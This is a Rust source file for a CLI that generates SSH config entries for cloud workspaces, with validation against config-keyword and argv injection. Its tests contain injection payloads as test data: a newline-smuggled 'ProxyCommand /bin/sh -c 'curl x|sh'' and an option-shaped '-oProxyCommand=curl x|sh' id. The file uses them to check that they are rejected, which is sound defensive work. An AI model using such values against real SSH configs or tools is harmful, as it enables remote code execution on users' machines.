//! `~/.ssh/kloudlite_config`: a generated file, plus one `Include` line in the config the user
//! owns. Regenerating must be safe, so the block file is rewritten whole and the Include is
//! added only when it is not already there.

use std::path::PathBuf;

fn home() -> PathBuf {
    dirs::home_dir().unwrap_or_else(|| PathBuf::from("."))
}

/// The name goes into `Host {name}` verbatim, so a newline in one would append arbitrary
/// keywords — a `ProxyCommand` under `Host *` runs on THIS machine for every ssh anywhere. The
/// api refuses such a name (`model::valid_ws_name`), and this is the second half of the same
/// rule: an object written before that check, or by any other path, is skipped rather than
/// rendered. Duplicated rather than shared because the CLI depends on no server crate.
///
/// A leading `-` is refused too: `kl ws ssh` puts the id into ssh's argv and into a
/// shell-parsed `ProxyCommand`, where `-oProxyCommand=…` is an option, not a host.
pub fn safe_name(name: &str) -> bool {
    !name.is_empty()
        && !name.starts_with('-')
        && name.len() <= 63
        && name.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
}

pub fn render(workspaces: &[crate::api::Workspace], known_hosts: &std::path::Path) -> String {
    let mut s = String::from("# Managed by kl. Edits are overwritten by `kl ws ssh-config`.\n");
    for w in workspaces {
        // The id is checked by the same rule for the same reason: it is written into `HostName`
        // and `HostKeyAlias`, and nothing here should trust the shape of either string.
        if !safe_name(&w.name) || !safe_name(&w.id) {
            s.push_str("\n# Skipped a workspace whose name cannot appear in an ssh config.\n");
            continue;
        }
        s.push_str(&format!(
            "\nHost {name}\n  HostName {id}\n  User kl\n  ProxyCommand kl ws proxy {id}\n  \
             UserKnownHostsFile {kh}\n  HostKeyAlias {id}\n",
            name = w.name,
            id = w.id,
            kh = known_hosts.display(),
        ));
    }
    s
}

pub fn write(workspaces: &[crate::api::Workspace]) -> Result<PathBuf, String> {
    let ssh = home().join(".ssh");
    // ssh REFUSES to use a config directory others can write, so creating it at the umask's
    // discretion can leave `kl ws ssh-config` writing a file ssh will not read.
    let mut b = std::fs::DirBuilder::new();
    b.recursive(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::DirBuilderExt;
        b.mode(0o700);
    }
    b.create(&ssh).map_err(|e| e.to_string())?;
    let block = ssh.join("kloudlite_config");
    crate::config::write_atomic(&block, &render(workspaces, &crate::config::known_hosts()))?;

    // ssh takes the FIRST value it sees for a keyword, so an Include appended after the user's own
    // `Host *` block would silently lose to it.
    let cfg = ssh.join("config");
    let include = format!("Include {}\n", block.display());
    let existing = std::fs::read_to_string(&cfg).unwrap_or_default();
    if !existing.contains(include.trim_end()) {
        crate::config::write_atomic(&cfg, &format!("{include}{existing}"))?;
    }
    Ok(block)
}

#[cfg(test)]
mod tests {
    use crate::api::Workspace;

    fn ws(name: &str) -> Workspace {
        Workspace { id: "ws-1".into(), name: name.into(), state: "ready".into(), packages: vec![] }
    }

    /// A team workspace named with a newline would otherwise write a `ProxyCommand` under
    /// `Host *` into every teammate's ssh config — remote code execution on their machine, from a
    /// field one of them typed.
    #[test]
    fn a_name_that_could_inject_keywords_is_skipped() {
        let kh = std::path::Path::new("/kh");
        let out = super::render(&[ws("x\n  ProxyCommand /bin/sh -c 'curl x|sh'\nHost *")], kh);
        assert!(!out.contains("ProxyCommand"), "{out}");
        assert!(out.contains("# Skipped a workspace"), "{out}");

        let ok = super::render(&[ws("dev.1_a-b")], kh);
        assert!(ok.contains("Host dev.1_a-b\n"), "{ok}");
    }

    /// The id the api hands back goes into ssh's argv and a shell-parsed ProxyCommand, so an
    /// option-shaped or shell-shaped value must be refused before either sees it.
    #[test]
    fn an_id_shaped_like_an_option_or_shell_is_refused() {
        for bad in ["-oProxyCommand=curl x|sh", "-oStrictHostKeyChecking", "ws 1", "a;b", ""] {
            assert!(!super::safe_name(bad), "{bad:?}");
        }
        assert!(super::safe_name("ws-1"));
    }
}
